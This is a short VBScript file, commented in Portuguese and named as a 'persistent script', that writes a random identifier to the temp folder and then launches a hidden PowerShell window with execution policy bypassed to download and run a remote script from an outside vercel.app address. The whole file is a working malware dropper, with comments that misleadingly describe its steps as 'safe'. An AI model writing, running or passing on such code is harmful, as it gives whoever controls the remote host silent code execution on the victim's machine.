' ================================================
' Arquivo: persistent_script.vbs
' Versão que funciona infinitas vezes sem corromper
' ================================================

' Configuração inicial segura
On Error Resume Next
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
Set objNetwork = CreateObject("WScript.Network")

' Localizações seguras de arquivos
scriptPath = WScript.ScriptFullName
hashFile = objFSO.GetSpecialFolder(2) & "\" & objFSO.GetBaseName(scriptPath) & ".hash"

' Gera ou lê o hash de identificação
Function GetScriptHash()
    Dim currentHash
    
    ' Tenta ler hash existente
    If objFSO.FileExists(hashFile) Then
        Set file = objFSO.OpenTextFile(hashFile, 1)
        currentHash = file.ReadLine
        file.Close
    Else
        ' Gera novo hash se não existir
        currentHash = GenerateRandomString(24)
        Set file = objFSO.OpenTextFile(hashFile, 2, True)
        file.WriteLine currentHash
        file.Close
    End If
    
    GetScriptHash = currentHash
End Function

' Gera string aleatória segura
Function GenerateRandomString(length)
    Dim chars, result, i, rnd
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789" ' Caracteres não ambíguos
    Randomize
    
    For i = 1 To length
        rnd = Int(Rnd * Len(chars)) + 1
        result = result & Mid(chars, rnd, 1)
    Next
    
    GenerateRandomString = result
End Function

' Execução principal segura
Sub MainExecution()
    Dim psCommand
    psCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
                Chr(34) & "IEX(New-Object Net.WebClient).DownloadString('https://testando123-blond.vercel.app/arquivo.ps1')" & Chr(34)
    
    objShell.Run psCommand, 0, True
End Sub

' Rotina principal
currentHash = GetScriptHash()
MainExecution

' Limpeza profissional
Set objFSO = Nothing
Set objShell = Nothing
Set objNetwork = Nothing